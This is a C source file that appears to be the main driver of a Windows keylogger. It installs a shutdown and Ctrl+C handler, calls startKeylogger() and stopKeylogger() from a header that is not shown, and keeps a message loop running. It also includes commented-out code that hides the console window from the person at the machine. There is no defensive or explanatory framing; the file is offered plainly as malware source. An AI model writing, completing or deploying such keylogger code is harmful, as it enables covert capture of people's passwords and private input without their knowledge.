#include <windows.h>
#include <stdio.h>
#include "keylogger.h"

// Global flag for continuous operation
static BOOL running = TRUE;

// Control Handler function to handle Ctrl+C and system shutdown
BOOL WINAPI ControlHandler(DWORD fdwCtrlType) {
    switch (fdwCtrlType) {
        case CTRL_C_EVENT:
        case CTRL_CLOSE_EVENT:
        case CTRL_BREAK_EVENT:
        case CTRL_LOGOFF_EVENT:
        case CTRL_SHUTDOWN_EVENT:
            running = FALSE;
            Sleep(1000); // Give time for cleanup
            return TRUE;
        default:
            return FALSE;
    }
}

int main(void) {
    // Hide console window
    //HWND consoleWindow = GetConsoleWindow();
    //ShowWindow(consoleWindow, SW_HIDE);

    // Set up the control handler
    if (!SetConsoleCtrlHandler(ControlHandler, TRUE)) {
        MessageBox(NULL, "Could not set control handler", "Error", MB_OK);
        return 1;
    }

    // Start the keylogger
    if (!startKeylogger()) {
        MessageBox(NULL, "Failed to start keylogger", "Error", MB_OK);
        return 1;
    }

    // Message loop with periodic check
    MSG msg;
    while (running) {
        // Process any pending messages
        while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }

        // Small sleep to prevent high CPU usage
        Sleep(10);
    }

    // Cleanup
    stopKeylogger();
    return 0;
}